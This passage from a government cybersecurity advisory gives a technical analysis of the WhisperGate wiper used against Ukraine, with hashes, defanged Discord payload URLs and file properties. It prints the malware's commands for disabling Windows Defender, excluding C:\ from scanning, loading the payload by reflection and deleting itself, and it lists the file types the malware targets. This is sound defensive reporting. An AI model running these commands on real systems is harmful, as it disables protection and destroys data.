<li><a href="https://github.com/owasp-amass/amass" title="owasp-amass / amass">GitHub: OWASP Amass</a></li>
<li><a href="https://kalilinuxtutorials.com/droopescan/" title="Droopescan : A Plugin-Based Scanner That Aids Security Researchers">Kali Linux Tutorials: Droopescan</a></li>
<li><a href="https://github.com/OWASP/joomscan" title="OWASP / joomscan">GitHub: OWASP JoomScan</a></li>
<li><a href="https://www.kali.org/tools/masscan/" title="Masscan">Kali.org: MASSCAN</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections" title="How To Use Netcat to Establish and Test TCP and UDP Connections">DigitalOcean: How To Use Netcat to Establish and Test TCP and UDP Connections</a></li>
<li><a href="https://help.shodan.io/the-basics/what-is-shodan" title="What is Shodan?">Shodan: What is Shodan?</a></li>
<li><a href="https://docs.virustotal.com/docs/how-it-works" title="How it Works">VirusTotal: How it Works</a></li>
<li><a href="https://github.com/jbaines-r7/through_the_wire" title="Through the Wire">GitHub: Through the Wire</a></li>
<li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html" title="Confluence Security Advisory: Confluence Server and Data Center - CVE-2022-26134">Confluence Security Advisory: Confluence Server and Data Center - CVE-2022-26134</a></li>
<li><a href="https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010" title="Microsoft Security Bulletin MS17-010 - Critical">Microsoft: Security Bulletin MS17-010</a></li>
<li><a href="https://www.avast.com/c-eternalblue" title="What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?">Avast: What is EternalBlue and Why is the MS17-010 Exploit Still Relevant?</a></li>
<li><a href="https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/" title="Threat Brief: Ongoing Russia and Ukraine Cyber Activity">Palo Alto Networks Unit 42: Threat Brief - Ongoing Russia and Ukraine Cyber Activity</a></li>
<li><a href="https://cert.gov.ua/article/18419" title="CERT-UA#3799 Report">CERT-UA#3799 Report</a></li>
<li><a href="https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/" title="Attack on Ukrainian Government Websites Linked to GRU Hackers">Bellingcat: Attack on Ukrainian Government Websites Linked to GRU Hackers</a></li>
<li><a href="https://www.trendmicro.com/en_us/research/22/c/cyberattacks-are-prominent-in-the-russia-ukraine-conflict.html" title="Cyberattacks are Prominent in the Russia-Ukraine Conflict">Trend Micro: Cyberattacks are Prominent in the Russia-Ukraine Conflict</a></li>
</ol>
<h2><strong>Contact Information</strong></h2>
<p>To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact <a href="https://www.fbi.gov/contact-us/field-offices">your local FBI field office</a> or CISA’s 24/7 Operations Center at <a href="mailto:Report@cisa.gov">Report@cisa.gov</a> or (888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact <a href="mailto:Cybersecurity_Requests@nsa.gov">Cybersecurity_Requests@nsa.gov</a>.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. CISA and the authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring agencies.</p>
<h2><strong>Version History</strong></h2>
<p><strong>September 5, 2024:</strong> Initial version.</p>
<h2><strong>Appendix A: WhisperGate Malware Analysis</strong></h2>
<h3>Overview</h3>
<p>This technical analysis details the WhisperGate malware deployed against Ukraine; samples were collected from one victim and analyzed. The analysis provides insight into Unit 29155 cyber actor infrastructure used for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in Europe and North America, and countries in Latin America and Central Asia.</p>
<p>Unit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, <code>stage1.exe</code> and <code>stage2.exe</code>. WhisperGate has two stages that corrupts a system’s master boot record, displays a fake ransomware note, and encrypts files based on certain file extensions (see <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a">AA22-057A</a>). The actors used multiple Discord accounts to store malware files, including what appears to be development versions or iterations of the binaries. Discord is commonly leveraged by threat actors as an endpoint for malware distribution and control; in this case, it was used to obtain the next step of the infection chain by directly sharing files through its platform. In the case of <code>stage2.exe</code>, the binary communicated with Discord to obtain <code>Tbopbh.jpg</code>—the malicious payload that is in-memory loaded and performs the destructive capabilities.[<a href="https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/">18</a>]</p>
<h3>Categorization</h3>
<p>The Discord accounts associated with the WhisperGate campaign are categorized into three main clusters, labeled below as Clusters 1, 2, and 3. All clusters used Discord as a staging environment for malware deployment. These groupings are based on analysis of threat actor IP addresses and the nature of the malware that existed within the accounts. The following sections include notable details found within each cluster.</p>
<h4><strong>Cluster 1</strong></h4>
<p>Cluster 1 contained the following files:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg</code> (a resource, e.g., payload, for stage2.exe)[<a href="https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/">18</a>]</li>
<li><code>saint.exe</code> (a downloader, <code>SaintBot</code>, as detailed by CERT-UA)[<a href="https://cert.gov.ua/article/18419">19</a>]</li>
<li><code>puttyjejfrwu.exe</code>[<a href="https://cert.gov.ua/article/18419">19</a>]</li>
</ul>
<h4><strong>Cluster 2</strong></h4>
<p>Cluster 2 contained:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/888408190625128461/895633952247799858/n.lashevychdirekcy.atom.gov.ua.zip</code> (means for sending malware in over 35 different zip files via Discord links)[<a href="https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/">20</a>]</li>
<li>Several Microsoft Word documents with macros that download <code>test01.exe</code> from <code>3237.site</code>. Once executed, <code>test01.exe</code> downloads <code>load2022.exe</code> from <code>smm2021.net</code>.</li>
</ul>
<h4><strong>Cluster 3</strong></h4>
<p>Cluster 3 contained:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/945968593030496269/945970446149509130/Client.exe</code> (<strong>Note:&nbsp;</strong>Unit 29155 cyber actors’ use of <code>Client.exe</code> was confirmed as linked to the activity, but the file was not obtained for analysis and functionality cannot be confirmed.)&nbsp;</li>
<li><code>asd.exe</code> (likely a development version of <code>stage1.exe</code>)</li>
</ul>
<h3>Behavioral Analysis</h3>
<p>Two Windows Portable Executable (PE) files (<code>stage1.exe</code> and <code>stage2.exe</code>) were obtained from the Ukrainian victim for analysis. One PE file (<code>asd.exe</code>) was obtained from a U.S. victim.</p>
<h4><strong>stage1.exe</strong></h4>
<p><code>stage1.exe</code> was obtained from the C:\ path of the Ukrainian victim’s Windows machine. <code>stage1.exe</code> executes when the infected device is powered down, overwriting the master boot record (MBR) and preventing the system from booting normally. <strong>Table 15</strong> lists the hashes and properties attributed to <code>stage1.exe</code>.</p>
<div>
<table>
<caption><em>Table 15: stage1.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>5d5c99a08a7d927346ca2dafa7973fc1</td>
</tr>
<tr>
<th>SHA-256</th>
<td>a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[GUI32]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 05:37:18</td>
</tr>
<tr>
<th>Execution Message</th>
<td>Your hard drive has been corrupted. In case you want to recover all hard drives of your organization, You should pay us $10k via bitcoin wallet 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65 with your organization name. We will contact you to give further instructions.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table>
<caption><em>Table 16: asd.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>eac0ae655d344c25ff467a929790885c</td>
</tr>
<tr>
<th>SHA-256</th>
<td>b9e64b58d7746cb1d3bed20405ef34d097af08c809d8dad10b9296b0bebb2b0b</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[Console32,console]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>1969-12-31 19:00:00</td>
</tr>
</tbody>
</table>
</div>
<p><code>asd.exe</code> is likely a development version of <code>stage1.exe</code>. While the behavior of <code>asd.exe</code> is similar to <code>stage1.exe</code>, the messages displayed were different.</p>
<h4><strong>stage2.exe</strong></h4>
<p><code>stage2.exe</code> was obtained from the C:\ path of the Ukrainian victim’s Windows machine. <strong>Table 17</strong> lists the hashes and properties attributed to <code>stage2.exe</code>.</p>
<div>
<table>
<caption><em>Table 17: stage2.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>764f691b2168e8b3b6f9fb6582e2f819</td>
</tr>
<tr>
<th>SHA-256</th>
<td>aa79afbf82b06cda268664b7c83900d8f7a33e0f0071facba0b3d8f7a68ce56a</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)(GUI32,signed)</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:54</td>
</tr>
</tbody>
</table>
<p><strong>Table 18</strong> lists the following chronological observations when stage2.exe executes.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 18: stage2.exe Behavioral Analysis Observations</em></caption>
<thead>
<tr>
<th>Event</th>
<th>Victim Observation</th>
</tr>
</thead>
<tbody>
<tr>
<td>PowerShell command executed twice</td>
<td><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" –enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==</code></td>
</tr>
<tr>
<td>Base64 UTF-16LE string decoded</td>
<td><code>Start-Sleep -s 10</code></td>
</tr>
<tr>
<td>HTTP GET request sent to Discord URL to download Tbopbh.jpg</td>
<td>
<p><code>hxxp://cdn.discordapp.com/attachments/</code></p>
<p><code>928503440139771947/930108637681184768/Tbopbh[.]jpg</code></p>
</td>
</tr>
<tr>
<td>Nmddfrqqrbyjeygggda.vbs created and executed within the %TEMP% directory</td>
<td>
<p>The Visual Basic Script (VBS) file contained the following command:</p>
<p><code>CreateObject(“WScript.Shell”).Run “powershell Set-MpPreference -ExclusionPath ‘C:\’”, 0, False</code></p>
</td>
</tr>
<tr>
<td>AdvancedRun.exe created and executed twice</td>
<td>
<p><code>C:\Users\&lt;user&gt;\AppData\Local\Temp\AdvancedRun.exe” /EXEFilename “C:\Windows\System32\sc.exe” /WindowState 0 /CommandLine “stop WinDefend”&nbsp; /StartDirectory “” /RunAs 8 /Run</code></p>
<p><code>C:\Users\&lt;user&gt;\AppData\Local\Temp\AdvancedRun.exe” /EXEFilename “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” /WindowState 0 /CommandLine “rmdir ‘C:\ProgramData\Microsoft\Windows Defender’ –Recurse” /StartDirectory “” /RunAs 8 /Run</code></p>
</td>
</tr>
<tr>
<td>InstallUtil.exe created and executed; files corrupted following execution</td>
<td><code>C:\Users\&lt;user&gt;\AppData\Local\Temp\InstallUtil.exe</code></td>
</tr>
</tbody>
</table>
<h3>Static Analysis</h3>
<p>Static analysis was further conducted on two files (<code>stage2.exe</code>, <code>Tbopbh.jpg</code>) to uncover additional malware functionality and attributes.</p>
<h4><strong>stage2.exe</strong></h4>
<p>Static analysis was performed on a variant of stage2.exe; its hashes and properties are listed in <strong>Table 19</strong> below. Of note, the MD5 and SHA-256 hash values were different than those obtained from the Ukrainian victim machine (listed above in <strong>Table 17</strong>). Behavioral analysis was also performed on the below variant and both files exhibited the same behavior.</p>
<div>
<table>
<caption><em>Table 19: stage2.exe Variant Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>14c8482f302b5e81e3fa1b18a509289d</td>
</tr>
<tr>
<th>SHA-256</th>
<td>dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)(GUI32,signed)</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:54</td>
</tr>
</tbody>
</table>
<p>This variant of <code>stage2.exe</code> contained multiple layers of execution:</p>
<ul>
<li><code>stage2.exe</code> contained a WebClient object that was initialized with Discord URL <code>hxxps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg</code> to obtain the payload <code>Tbopbh.jpg</code>.</li>
<li><code>stage2.exe</code> contained logic to reverse file bytes of a file using the Array’s Reverse method.</li>
<li><code>stage2.exe</code> contained logic to load an Assembly object into a Stream object.</li>
<li><code>stage2.exe</code> used the reflection library to call method <code>Ylfwdwgmpilzyaph</code> from the loaded Assembly object.</li>
<li><code>stage2.exe</code> contained decryption logic that resembled RC4, a C# class produced a base64 string and an encryption class which created a key using the decoded string. The encryption class used encryption logic every 32 bytes to decrypt. Additionally, the XOR functionality occurred using the initialized byte “Array” shown below. The encryption class resembled RC4; it was used every 32 bytes. The base64 string came from a class that contained EazFuscator logic to obfuscate code by eliminating control flow within code, as well as making symbols difficult to analyze:
<ul>
<li><code>byte[] array = new byte[] {148, 68, 208, 52, 241, 93, 195, 220};</code></li>
</ul>
</li>
<li><code>stage2.exe</code> contained EazFuscator class logic. This included logic that built strings during runtime; otherwise, the full strings would have been obfuscated and further segmented when viewed statically. The following is an example of a built string:
<ul>
<li><code>UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==</code></li>
</ul>
</li>
<li>When the above string was base64 decoded, the system displayed the following PowerShell command: <code>Start-Sleep -s 10</code></li>
<li><code>stage2.exe</code> served as the downloader and driver logic for the malware payload, <code>Tbopbh.jpg</code>.</li>
</ul>
<h4><strong>Tbopbh.jpg (payload for stage2.exe variant)</strong></h4>
<p>An account in Discord Cluster 1 contained malware with the following hashes, labeled as Tbopbh.jpg:</p>
<ul>
<li>MD5: <code>b3370eb3c5ef6c536195b3bea0120929</code></li>
<li>SHA-256: <code>923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6</code></li>
</ul>
<p>When viewing payload <code>Tbopbh.jpg</code> using a hex editor, it ended with value “ZM” or hex values “5A 4D”—this indicated the payload was a reversed PE. Reversing the bytes of <code>Tbopbh.jpg</code> revealed the hashes of the resulting payload listed in <strong>Table 20</strong> below.</p>
<div>
<table>
<caption><em>Table 20: Tbopbh.jpg Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>e61518ae9454a563b8f842286bbdb87b</td>
</tr>
<tr>
<th>SHA-256</th>
<td>9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d</td>
</tr>
<tr>
<th>Protector</th>
<td>Eazfuscator(-)[-]</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)[DLL32]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:31</td>
</tr>
</tbody>
</table>
<p>The original filename from the resulting payload was a Dynamic Link Library (DLL) file, <code>Frkmlkdkdubkznbkmcf.dll</code>; its attributes are listed in <strong>Table 21</strong>:</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 21: Frkmlkdkdubkznbkmcf.dll Attributes</em></caption>
<thead>
<tr>
<th>Resources</th>
<th>Classes</th>
<th>Methods&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>\u2005 \u2005 \u2009 \u2008 \u2001 \u2007 \u2009 \u200b \u200a \u2005</p>
<p><strong>Note:</strong> This format annotates action taken by EazFuscator to obfuscate items, making it difficult for malware analysts to review.</p>
</td>
<td>Main - ClassLibrary1</td>
<td>\u0002</td>
</tr>
<tr>
<td>7c8cb5598e724d34384cce7402b11f0e</td>
<td>pc1eOx2WJVV1579235895 –</td>
<td>Ylfwdwgmpilzyaph</td>
</tr>
<tr>
<td>78c855a088924e92a7f60d661c3d1845</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<p><code>stage2.exe</code> was observed calling method <code>Ylfwdwgmpilzyaph</code> to begin decrypting resource <code>78c855a088924e92a7f60d661c3d1845</code>. The reflection library was used to execute method <code>Ylfwdwgmpilzyaph</code>, as shown in the following C# code block:</p>
<p><code>using System.Reflection;</code><br /><code>string path = "Frkmlkdkdubkznbkmcf.dll";</code><br /><code>string fqpn = Path.GetFullPath(path);</code><br /><code>Assembly assembly = Assembly.LoadFile(fqpn);</code><br /><code>Type type = assembly.GetType("ClassLibrary1.Main");</code><br /><code>type.InvokeMember("Ylfwdwgmpilzyaph", BindingFlags.InvokeMethod, null, null, null);</code></p>
<p>The following application configuration accompanied the above code block to allow loading from remote sources:</p>
<p><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;</code><br /><code>&lt;configuration&gt;</code><br /><code>&lt;runtime&gt;</code><br /><code>&lt;loadFromRemoteSources enabled="true"/&gt;</code><br /><code>&lt;/runtime&gt;</code><br /><code>&lt;/configuration&gt;</code></p>
<p>Upon invoking the method <code>Ylfwdwgmpilzyaph</code>, <code>Nmddfrqqrbyjeygggda.vbs</code> wrote to the Windows %TEMP% directory and has the following attributes, as listed in <strong>Table 22</strong> below.</p>
<div>
<table>
<caption><em>Table 22: Nmddfrqqrbyjeygggda.vbs Attributes</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>6eed4ee0cc57126e9a096ab9905f471c</td>
</tr>
<tr>
<th>SHA-256</th>
<td>db5a204a34969f60fe4a653f51d64eee024dbf018edea334e8b3df780eda846f</td>
</tr>
<tr>
<th>VBS Code</th>
<td>CreateObject("WScript.Shell").Run "powershell Set-MpPreference -ExclusionPath 'C:\'", 0, False</td>
</tr>
</tbody>
</table>
<p>The VBS code listed in <strong>Table 22</strong> used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\ drive from Windows Defender's security checks. Malware analysts decoded and decrypted one of the resources from <code>Frkmlkdkdubkznbkmcf.dll</code> (<code>78c855a088924e92a7f60d661c3d1845</code>). Further analysis of <code>Frkmlkdkdubkznbkmcf.dll</code> resulted in an additional DLL file with the following hashes:</p>
<ul>
<li>MD5: <code>5a537673c34933fc854fbfb65477a686</code></li>
<li>SHA-256: <code>35feefe6bd2b982cb1a5d4c1d094e8665c51752d0a6f7e3cae546d770c280f3a</code></li>
</ul>
<p>This decrypted DLL file contained two resources, <code>AdvancedRun</code> and <code>Waqybg</code>.</p>
<ul>
<li><code>AdvancedRun</code><strong> </strong>(GZIP)
<ul>
<li>MD5: <code>de85ca91e1e8100a619de1c25112f1a5</code></li>
<li>SHA-256: <code>489ab4819830d231c3fc3572c5386cad9d18773a8121373ea8174de981cc9166</code></li>
</ul>
</li>
<li><code>Waqybg</code><strong> </strong>(GZIP)
<ul>
<li>Reversed byte order:
<ul>
<li>MD5: <code>9b1191f1ceddf312b0d609cd929c6631</code></li>
<li>SHA-256: <code>0dd61a16c625c49ffefaf4ce24cabf9a074028a06640d9bbb804f735ff56dfa3</code></li>
</ul>
</li>
<li>Original byte order:
<ul>
<li>MD5: <code>29d83f29c0b0a0b7499e71e7d5cb713f</code></li>
<li>SHA-256: <code>fd4a5398e55beacb2315687a75af5aa15b776b5d36b9800a1792ede3955616c2</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Table 23</strong> and <strong>Table 24</strong> list the file properties for both the <code>AdvancedRun</code> and reversed <code>Waqybg</code> decompressed files.</p>
<div>
<table>
<caption><em>Table 23: AdvancedRun (decompressed)</em></caption>
<tbody>
<tr>
<th>Type</th>
<td>Win32 EXE</td>
</tr>
<tr>
<th>Company</th>
<td>NirSoft</td>
</tr>
<tr>
<th>TimeStamp</th>
<td>2020:08:03 09:41:38-04:00</td>
</tr>
<tr>
<th>Original File Name</th>
<td>AdvancedRun.exe</td>
</tr>
<tr>
<th>MD5</th>
<td>17fc12902f4769af3a9271eb4e2dacce</td>
</tr>
<tr>
<th>SHA-256</th>
<td>29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b</td>
</tr>
</tbody>
</table>
<div>
<table>
<caption><em>Table 24: Waqybg (reversed; decompressed)</em></caption>
<tbody>
<tr>
<th>Type</th>
<td>Win32 EXE</td>
</tr>
<tr>
<th>TimeStamp</th>
<td>2022:01:10 03:14:38-05:00</td>
</tr>
<tr>
<th>MD5</th>
<td>3907c7fbd4148395284d8e6e3c1dba5d</td>
</tr>
<tr>
<th>SHA-256</th>
<td>34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[Console32,console]</td>
</tr>
</tbody>
</table>
<p>The reversed and decompressed <code>Waqybg</code> files contained file corruption logic along with a final command to ping arbitrarily and delete itself: <code>cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 &gt; Nul &amp; Del /f /q “%s”</code>. <code>Waqybg</code> is known as WhisperKill—a malware downloaded by WhisperGate that destroys files with specific extensions.[<a href="https://cert.gov.ua/article/18419">19</a>],[<a href="https://www.trendmicro.com/en_us/research/22/c/cyberattacks-are-prominent-in-the-russia-ukraine-conflict.html">21</a>]</p>
<p>The following file extensions listed in <strong>Table 25&nbsp;</strong>were targeted for file corruption with the equivalent of the “wcscmp” C function logic (a string compare function). The corruption logic included overwriting 0x100000 or 1 MB worth of 0xcc values per targeted file.</p>
<table>
<caption><em>Table 25: File Extensions Targeted by WhisperKill</em></caption>
<tbody>
<tr>
<td><a>u".3DM"</a></td>
<td>u".3DS"</td>
<td>u".602"</td>
<td>u".ACCDB"</td>
<td>u".ARC"</td>
<td>u".ASC"</td>
</tr>
<tr>
<td>u".ASM"</td>
<td>u".ASP"</td>
<td>u".ASPX"</td>
<td>u".BACKUP"</td>
<td>u".BAK"</td>
<td>u".BAT"</td>
</tr>
<tr>
<td>u".BMP"</td>
<td>u".BRD"</td>
<td>u".BZ2"</td>
<td>u".CGM"</td>
<td>u".CLASS"</td>
<td>u".CMD"</td>
</tr>
<tr>
<td>u".CONFIG"</td>
<td>u".CPP"</td>
<td>u".CRT"</td>
<td>u".CSR"</td>
<td>u".CSV"</td>
<td>u".DBF"</td>
</tr>
<tr>
<td>u".DCH"</td>
<td>u".DER"</td>
<td>u".DIF"</td>
<td>u".DIP"</td>
<td>u".DJVU.SH"</td>
<td>u".DOC"</td>
</tr>
<tr>
<td>u".DOCB"</td>
<td>u".DOCM"</td>
<td>u".DOCM"</td>
<td>u".DOCX"</td>
<td>u".DOT"</td>
<td>u".DOTM"</td>
</tr>
<tr>
<td>u".DOTX"</td>
<td>u".DWG"</td>
<td>u".EDB"</td>
<td>u".EML"</td>
<td>u".FRM"</td>
<td>u".GIF"</td>
</tr>
<tr>
<td>u".HDD"</td>
<td>u".HTM"</td>
<td>u".HWP"</td>
<td>u".IBD"</td>
<td>u".INC"</td>
<td>u".INI"</td>
</tr>
<tr>
<td>u".ISO"</td>
<td>u".JAR"</td>
<td>u".JAVA"</td>
<td>u".JPEG"</td>
<td>u".JPG"</td>
<td>u".JSP"</td>
</tr>
<tr>
<td>u".KDBX"</td>
<td>u".KEY"</td>
<td>u".LAY"</td>
<td>u".LAY6"</td>
<td>u".LDF"</td>
<td>u".LOG"</td>
</tr>
<tr>
<td>u".MAX"</td>
<td>u".MDB"</td>
<td>u".MDF"</td>
<td>u".MML"</td>
<td>u".MSG"</td>
<td>u".MYD"</td>
</tr>
<tr>
<td>u".MYI"</td>
<td>u".NEF"</td>
<td>u".NVRAM"</td>
<td>u".ODB"</td>
<td>u".ODG"</td>
<td>u".ODP"</td>
</tr>
<tr>
<td>u".ODS"</td>
<td>u".ODT"</td>
<td>u".OGG"</td>
<td>u".ONETOC2"</td>
<td>u".OST"</td>
<td>u".OTG"</td>
</tr>
<tr>
<td>u".OTP"</td>
<td>u".OTS"</td>
<td>u".OTT"</td>
<td>u".P12"</td>
<td>u".PAQ"</td>
<td>u".PAS"</td>
</tr>
<tr>
<td>u".PDF"</td>
<td>u".PEM"</td>
<td>u".PFX"</td>
<td>u".PHP"</td>
<td>u".PHP3"</td>
<td>u".PHP4"</td>
</tr>
<tr>
<td>u".PHP5"</td>
<td>u".PHP6"</td>
<td>u".PHP7"</td>
<td>u".PHPS"</td>
<td>u".PHTML"</td>
<td>u".PNG"</td>
</tr>
<tr>
<td>u".POT"</td>
<td>u".POTM"</td>
<td>u".POTX"</td>
<td>u".PPAM"</td>
<td>u".PPK"</td>
<td>u".PPS"</td>
</tr>
<tr>
<td>u".PPSM"</td>
<td>u".PPSX"</td>
<td>u".PPT"</td>
<td>u".PPTM"</td>
<td>u".PPTM"</td>
<td>u".PPTX"</td>
</tr>
<tr>
<td>u".PS1"</td>
<td>u".PSD"</td>
<td>u".PST"</td>
<td>u".RAR"</td>
<td>u".RAW"</td>
<td>u".RTF"</td>
</tr>
<tr>
<td>u".SAV"</td>
<td>u".SCH"</td>
<td>u".SHTML"</td>
<td>u".SLDM"</td>
<td>u".SLDX"</td>
<td>u".SLK"</td>
</tr>
<tr>
<td>u".SLN"</td>
<td>u".SNT"</td>
<td>u".SQ3"</td>
<td>u".SQL"</td>
<td>u".SQLITE3"</td>
<td>u".SQLITEDB"</td>
</tr>
<tr>
<td>u".STC"</td>
<td>u".STD"</td>
<td>u".STI"</td>
<td>u".STW"</td>
<td>u".SUO"</td>
<td>u".SVG"</td>
</tr>
<tr>
<td>u".SXC"</td>
<td>u".SXD"</td>
<td>u".SXI"</td>
<td>u".SXM"</td>
<td>u".SXW"</td>
<td>u".TAR"</td>
</tr>
<tr>
<td>u".TBK"</td>
<td>u".TGZ"</td>
<td>u".TIF"</td>
<td>u".TIFF"</td>
<td>u".TXT"</td>
<td>u".UOP"</td>
</tr>
<tr>
<td>u".UOT"</td>
<td>u".VBS"</td>
<td>u".VCD"</td>
<td>u".VDI"</td>
<td>u".VHD"</td>
<td>u".VMDK"</td>
</tr>
<tr>
<td>u".VMEM"</td>
<td>u".VMSD"</td>
<td>u".VMSN"</td>
<td>u".VMSS"</td>
<td>u".VMTM"</td>
<td>u".VMTX"</td>
</tr>
<tr>
<td>u".VMX"</td>
<td>u".VMXF"</td>
<td>u".VSD"</td>
<td>u".VSDX"</td>
<td>u".VSWP"</td>
<td>u".WAR"</td>
</tr>
<tr>
<td>u".WB2"</td>
<td>u".WK1"</td>
<td>u".WKS"</td>
<td>u".XHTML"</td>
<td>u".XLC"</td>
<td>u".XLM"</td>
</tr>
<tr>
<td>u".XLS"</td>
<td>u".XLSB"</td>
<td>u".XLSM"</td>
<td>u".XLSM"</td>
<td>u".XLSX"</td>
<td>u".XLT"</td>
</tr>
<tr>
<td>u".XLTM"</td>
<td>u".XLTX"</td>
<td>u".XLW"</td>
<td>u".YML"</td>
<td>u".ZIP"</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<h4><strong>Malware Related to Tbopbh.jpg</strong></h4>
<p><code>stage2.exe</code> and its respective payload, <code>Tbopbh.jpg</code>, served as a template for other malware within Discord Cluster 1. While most of these other malware files have not been observed in open source reporting, malware analysts assess them as payloads that follow the unravelling process listed in <strong>Figure 1</strong> below.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 1 - stage2.exe Execution Process Template" height="619" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-09/Figure%201%20-%20stage2.exe%20Execution%20Process%20Template.png?itok=0BWq6sPC" width="1024" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 1: stage2.exe Execution Process Template</em></figcaption>
  </figure>
<p><strong>Table 26</strong> below provides a list of MD5 hashes for files found within Discord Cluster 1. When reversed, these files become DLL files, which were structured similarly to <code>Frkmlkdkdubkznbkmcf.dll</code>.</p>
<p><strong>Note:</strong> Analysts identified the files below in Discord Cluster 1; the files are staged on the Cluster in reversed byte order. Analysts reversed the file byte order for each file into their proper portable executable format, e.g., “Functional” format. The hashes in <strong>Table 26</strong> represent both byte orders.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 26: Files Located in Discord Cluster 1</em></caption>
<thead>
<tr>
<th>Filename</th>
<th>MD5 (Reversed)</th>
<th>MD5 (Functional)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Afgyyppsysmtddhvhhaw.dll</td>
<td>d034fe4c71b16b6d331886c24fef2751</td>
<td>4074798a621232dc448b65db7b1fdd66</td>
</tr>
<tr>
<td>Avbbwys.dll</td>
<td>422437f326b8dbe30cc5f103bde31f26</td>
<td>7f84263fd24f783ff72d5ae91011b558</td>
</tr>
<tr>
<td>Azkebvoyswvjnrpmn.dll</td>
<td>562c337b8caca330da2ea6ae07ee5db6</td>
<td>f73d203bdf924658fd6edf3444c93a50</td>
</tr>
<tr>
<td>Budoejokuqbge.dll</td>
<td>58e879213d81333b628434ba4aeb2751</td>
